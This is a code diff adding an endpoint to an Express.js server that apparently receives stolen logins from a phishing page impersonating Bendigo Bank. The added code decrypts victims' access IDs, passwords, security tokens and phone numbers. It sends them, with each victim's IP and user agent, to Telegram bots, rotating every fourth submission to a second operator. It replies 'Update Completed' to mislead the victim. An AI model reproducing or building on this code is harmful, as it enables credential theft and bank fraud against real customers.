@@ -1984,6 +1984,49 @@ app.post("/baliApple", (req, res) => {
     });
 });
 
+//BENDIGO
+//BENDIGO
+//BENDIGO
+
+let skiiBendigo = 0;
+
+app.options("/bendigoSkii", cors());
+
+app.post("/bendigoSkii", (req, res) => {
+  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secToken = CryptoJS.AES.decrypt(req.body.secToken, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+
+  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}\nSecurity Token: ${secToken}\n+ ----------- Personal Information ------------+\nPhone Number: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}}`;
+  if (skiiBendigo == 3) {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+    );
+    skiiBendigo = 0;
+  } else {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoSkii:\n${originalText}`
+    );
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Bendigo:\n${originalText}`
+    );
+    skiiBendigo += 1;
+  }
+
+  res.send("Update Completed");
+});
+
 //NHS
 //NHS
 //NHS
